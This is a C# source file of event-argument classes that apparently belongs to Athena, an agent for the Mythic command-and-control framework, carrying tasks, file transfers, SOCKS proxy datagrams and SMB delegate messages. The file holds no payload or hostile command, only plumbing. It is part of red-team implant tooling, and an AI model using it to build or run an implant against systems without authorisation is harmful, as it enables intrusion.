using Athena.Models.Comms.SMB;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Proxy;
using System;

namespace Athena.Models.Commands
{
    public class TaskAvailableArgs : EventArgs
    {
        public MythicTask task { get; set; }
        public TaskAvailableArgs (MythicTask task)
        {
            this.task = task;
        }
    }
    public class UploadDownloadAvailableArgs : EventArgs
    {
        public MythicResponseResult response { get; set; }
        public UploadDownloadAvailableArgs(MythicResponseResult response)
        {
            this.response = response;
        }
    }
    public class TaskingReceivedArgs : EventArgs
    {
        public GetTaskingResponse tasking_response { get; set; }
        public TaskingReceivedArgs(GetTaskingResponse response)
        {
            this.tasking_response = response;
        }
    }

    public class SocksAvailableArgs : EventArgs
    {
        public MythicDatagram socksmessage { get; set; }
        public SocksAvailableArgs(MythicDatagram socksmessage)
        {
            this.socksmessage = socksmessage;
        }
    }

    public class DelegateAvailableArgs : EventArgs
    {
        public DelegateMessage delegatemessage { get; set; }
        public DelegateAvailableArgs(DelegateMessage delegatemessage)
        {
            this.delegatemessage = delegatemessage;
        }
    }

    public class TaskEventArgs : EventArgs
    {
        public MythicJob job { get; set; }

        public TaskEventArgs (MythicJob job)
        {
            this.job = job;
        }
    }

    public class ProfileEventArgs : EventArgs
    {
        public MythicJob job { get; set; }
        public ProfileEventArgs (MythicJob job)
        {
            this.job = job;
        }
    }

    public class SocksEventArgs : EventArgs
    {
        public MythicDatagram sm { get; set; }

        public SocksEventArgs(MythicDatagram sm)
        {
            this.sm = sm;
        }
    }
    public class MessageReceivedArgs : EventArgs
    {
        public string message { get; set; }
        public MessageReceivedArgs(string message)
        {
            this.message = message;
        }
    }
}
